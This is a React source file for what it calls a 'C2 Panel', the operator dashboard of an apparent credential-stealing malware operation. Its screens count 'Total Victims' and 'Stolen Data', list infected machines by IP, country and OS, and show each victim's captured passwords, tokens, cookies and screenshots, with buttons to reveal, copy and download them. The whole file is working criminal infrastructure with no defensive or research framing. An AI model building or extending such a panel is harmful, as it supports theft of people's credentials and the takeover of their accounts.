import React, { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import { FaUsers, FaDatabase, FaEye, FaCopy, FaDownload, FaGlobe, FaShieldAlt } from 'react-icons/fa';
import { BrowserRouter, Routes, Route, Link, Navigate, useParams } from 'react-router-dom';
import './App.css';

const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:5000';

// ---------- MAIN APP ----------
function App() {
    const [user, setUser] = useState(null);
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [isLogin, setIsLogin] = useState(true);
    const [loading, setLoading] = useState(false);

    useEffect(() => {
        const token = localStorage.getItem('token');
        if (token) {
            fetch(`${API_URL}/api/verify`, {
                headers: { 'Authorization': `Bearer ${token}` }
            })
            .then(res => res.json())
            .then(data => {
                if (data.user) setUser(data.user);
            })
            .catch(() => {});
        }
    }, []);

    const handleAuth = async () => {
        setLoading(true);
        const endpoint = isLogin ? '/api/login' : '/api/register';
        try {
            const res = await fetch(`${API_URL}${endpoint}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password })
            });
            const data = await res.json();
            if (data.token) {
                localStorage.setItem('token', data.token);
                setUser(data.user);
                const audio = new Audio('/sounds/success.mp3');
                audio.volume = 0.3;
                audio.play().catch(() => {});
            } else {
                alert(data.error || 'Authentication failed');
            }
        } catch (err) {
            alert('Connection error. Is the backend running?');
        }
        setLoading(false);
    };

    if (!user) {
        return (
            <div className="login-container">
                <motion.div 
                    className="login-box"
                    initial={{ opacity: 0, y: -50 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ duration: 0.5 }}
                >
                    <h1>🎯 C2 Panel</h1>
                    <p className="subtitle">{isLogin ? 'Sign in to continue' : 'Create your account'}</p>
                    <input 
                        placeholder="Username" 
                        value={username}
                        onChange={e => setUsername(e.target.value)}
                        onKeyPress={e => e.key === 'Enter' && handleAuth()}
                    />
                    <input 
                        type="password"
                        placeholder="Password" 
                        value={password}
                        onChange={e => setPassword(e.target.value)}
                        onKeyPress={e => e.key === 'Enter' && handleAuth()}
                    />
                    <button onClick={handleAuth} disabled={loading}>
                        {loading ? '...' : (isLogin ? 'Login' : 'Register')}
                    </button>
                    <p className="toggle" onClick={() => setIsLogin(!isLogin)}>
                        {isLogin ? 'Need an account? Register' : 'Have an account? Login'}
                    </p>
                </motion.div>
            </div>
        );
    }

    return (
        <BrowserRouter>
            <div className="app">
                <header>
                    <div className="logo">
                        <span>🎯</span>
                        <h1>C2 Panel</h1>
                    </div>
                    <div className="header-right">
                        <span className="welcome">Welcome back, <b>{user.username}</b></span>
                        <button className="logout" onClick={() => {
                            localStorage.removeItem('token');
                            setUser(null);
                        }}>Logout</button>
                    </div>
                </header>

                <nav className="nav">
                    <Link to="/dashboard">Dashboard</Link>
                    <Link to="/victims">Victims</Link>
                </nav>

                <div className="content">
                    <Routes>
                        <Route path="/" element={<Navigate to="/dashboard" />} />
                        <Route path="/dashboard" element={<Dashboard user={user} />} />
                        <Route path="/victims" element={<VictimsList user={user} />} />
                        <Route path="/victims/:id" element={<VictimDetails />} />
                    </Routes>
                </div>
            </div>
        </BrowserRouter>
    );
}

// ---------- DASHBOARD ----------
function Dashboard({ user }) {
    const [stats, setStats] = useState({ total: 0, active: 0, data: 0 });
    const [recent, setRecent] = useState([]);

    useEffect(() => {
        fetch(`${API_URL}/api/stats?userId=${user.id}`, {
            headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
        })
        .then(res => res.json())
        .then(data => {
            setStats(data);
            setRecent(data.recent || []);
        })
        .catch(() => {});
    }, [user.id]);

    return (
        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
            <div className="stats-grid">
                <div className="stat-card">
                    <FaUsers className="icon cyan" />
                    <div className="label">Total Victims</div>
                    <div className="value">{stats.total || 0}</div>
                </div>
                <div className="stat-card">
                    <FaEye className="icon green" />
                    <div className="label">Active</div>
                    <div className="value">{stats.active || 0}</div>
                </div>
                <div className="stat-card">
                    <FaDatabase className="icon purple" />
                    <div className="label">Stolen Data</div>
                    <div className="value">{stats.data || 0}</div>
                </div>
                <div className="stat-card">
                    <FaShieldAlt className="icon red" />
                    <div className="label">Status</div>
                    <div className="value online">🟢 Online</div>
                </div>
            </div>

            <div className="recent-section">
                <h3>Recent Victims</h3>
                {recent.length === 0 && <p className="empty">No victims yet</p>}
                {recent.map(v => (
                    <motion.div 
                        key={v.id}
                        className="recent-item"
                        whileHover={{ x: 5 }}
                        onClick={() => window.location.href = `/victims/${v.id}`}
                    >
                        <span className="ip">{v.ip_address || 'Unknown'}</span>
                        <span className="name">{v.name || 'Unnamed'}</span>
                        <span className="time">{new Date(v.last_seen).toLocaleString()}</span>
                    </motion.div>
                ))}
            </div>
        </motion.div>
    );
}

// ---------- VICTIMS LIST ----------
function VictimsList({ user }) {
    const [victims, setVictims] = useState([]);

    useEffect(() => {
        fetch(`${API_URL}/api/victims?userId=${user.id}`, {
            headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
        })
        .then(res => res.json())
        .then(data => setVictims(data))
        .catch(() => {});
    }, [user.id]);

    return (
        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
            <h2 className="section-title">Victims</h2>
            <div className="victims-grid">
                {victims.length === 0 && <p className="empty">No victims captured yet</p>}
                {victims.map(v => (
                    <motion.div 
                        key={v.id}
                        className="victim-card"
                        whileHover={{ scale: 1.02 }}
                        onClick={() => window.location.href = `/victims/${v.id}`}
                    >
                        <div className="victim-header">
                            <span className="victim-name">{v.name || v.ip_address || 'Unknown'}</span>
                            <span className={`status-badge ${v.status}`}>{v.status || 'active'}</span>
                        </div>
                        <div className="victim-details">
                            <span><FaGlobe /> {v.country || 'Unknown'}</span>
                            <span>{v.os || 'Unknown OS'}</span>
                        </div>
                        <div className="victim-footer">
                            <span className="ip">{v.ip_address}</span>
                            <span className="time">{new Date(v.last_seen).toLocaleString()}</span>
                        </div>
                    </motion.div>
                ))}
            </div>
        </motion.div>
    );
}

// ---------- VICTIM DETAILS ----------
function VictimDetails() {
    const { id } = useParams();
    const [victim, setVictim] = useState(null);
    const [data, setData] = useState([]);
    const [showAll, setShowAll] = useState(false);
    const [activeTab, setActiveTab] = useState('all');

    useEffect(() => {
        fetch(`${API_URL}/api/victims/${id}/details`, {
            headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
        })
        .then(res => res.json())
        .then(result => {
            setVictim(result.victim);
            setData(result.data || []);
        })
        .catch(() => {});
    }, [id]);

    const copyToClipboard = (text) => {
        navigator.clipboard.writeText(text);
        const audio = new Audio('/sounds/success.mp3');
        audio.volume = 0.3;
        audio.play().catch(() => {});
    };

    const downloadData = (item) => {
        const blob = new Blob([item.data_content], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `${item.data_type}_${item.id}.txt`;
        a.click();
        URL.revokeObjectURL(url);
    };

    const filteredData = activeTab === 'all' ? data : data.filter(d => d.data_type === activeTab);

    const tabs = [
        { key: 'all', label: 'All' },
        { key: 'password', label: 'Passwords' },
        { key: 'token', label: 'Tokens' },
        { key: 'cookie', label: 'Cookies' },
        { key: 'screenshot', label: 'Screenshots' }
    ];

    if (!victim) return <div className="loading">Loading...</div>;

    return (
        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
            <div className="victim-detail-header">
                <h2>{victim.name || victim.ip_address || 'Unknown'}</h2>
                <div className="detail-meta">
                    <span>IP: {victim.ip_address}</span>
                    <span>OS: {victim.os || 'Unknown'}</span>
                    <span>First: {new Date(victim.first_seen).toLocaleString()}</span>
                    <span>Last: {new Date(victim.last_seen).toLocaleString()}</span>
                </div>
            </div>

            <div className="tabs">
                {tabs.map(tab => (
                    <button 
                        key={tab.key}
                        className={activeTab === tab.key ? 'active' : ''}
                        onClick={() => {
                            setActiveTab(tab.key);
                            const audio = new Audio('/sounds/click.mp3');
                            audio.volume = 0.2;
                            audio.play().catch(() => {});
                        }}
                    >
                        {tab.label} ({tab.key === 'all' ? data.length : data.filter(d => d.data_type === tab.key).length})
                    </button>
                ))}
                <button 
                    className="reveal-btn"
                    onClick={() => setShowAll(!showAll)}
                >
                    {showAll ? 'Hide All' : 'Reveal All'}
                </button>
            </div>

            <div className="data-list">
                {filteredData.length === 0 && <p className="empty">No data captured yet</p>}
                {filteredData.map(item => (
                    <motion.div 
                        key={item.id}
                        className="data-item"
                        initial={{ opacity: 0, x: -20 }}
                        animate={{ opacity: 1, x: 0 }}
                        whileHover={{ borderColor: '#06b6d4' }}
                    >
                        <span className="data-type">{item.data_type}</span>
                        <span className="data-content">
                            {showAll ? item.data_content : '••••••••••••••••'}
                        </span>
                        <div className="data-actions">
                            <button onClick={() => copyToClipboard(item.data_content)}>
                                <FaCopy />
                            </button>
                            <button onClick={() => downloadData(item)}>
                                <FaDownload />
                            </button>
                        </div>
                    </motion.div>
                ))}
            </div>
        </motion.div>
    );
}

export default App;
